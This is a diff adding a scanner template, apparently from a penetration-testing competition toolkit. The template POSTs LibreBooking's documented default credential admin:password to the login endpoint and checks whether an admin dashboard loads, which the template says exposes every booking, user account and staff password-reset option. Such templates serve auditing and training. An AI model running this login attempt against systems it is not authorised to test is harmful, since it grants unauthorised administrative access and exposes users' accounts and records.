@@ -1,0 +1,53 @@
+# LibreBooking default credential login attempt.
+id: librebooking-default-login
+
+info:
+  name: LibreBooking Default Credentials
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 1
+    kind: attack
+  description: |
+    LibreBooking (formerly phpScheduleIt) is a resource and facility
+    scheduling system used for venue, equipment and room reservations. Stock
+    installs document the default credential admin:password and older builds
+    carry SQL injection findings.
+
+    This template POSTs the default credential to the login endpoint and
+    matches the authenticated dashboard. A match means the reservation
+    administration console: every resource, every booking record, every user
+    account including other staff password reset options.
+
+    One POST request. The credential is a documented vendor default.
+  reference:
+    - https://github.com/LibreBooking/librebooking
+  tags: themepark,booking,default-login,attack
+
+http:
+  - raw:
+      - |
+        POST /Web/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        email=admin&password=password&login=Login
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: and
+        words:
+          - "Dashboard"
+          - "Schedule"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "password_error"
+          - "Login::"
